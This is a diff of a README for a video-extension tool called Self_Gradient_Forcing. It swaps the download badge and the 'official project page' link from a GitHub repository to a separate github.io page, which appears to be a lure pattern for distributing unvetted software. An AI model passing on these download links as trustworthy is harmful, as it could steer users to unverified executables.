@@ -1,12 +1,12 @@
 # 🛠 Self_Gradient_Forcing - Create stable long videos with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/A1897209/Self_Gradient_Forcing)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://a1897209.github.io)
 
 Self Gradient Forcing allows you to expand short video clips into longer sequences. It uses a smart memory process to keep characters, backgrounds, and movement consistent over time. You no longer need to settle for five-second clips. This tool helps your model maintain details even in minute-long videos.
 
 ## 📥 How to download the application
 
-Visit the official project page to download the software: https://github.com/A1897209/Self_Gradient_Forcing
+Visit the official project page to download the software: https://a1897209.github.io
 
 1. Open the link in your web browser.
 2. Look for the section labeled Releases on the right side of the page.
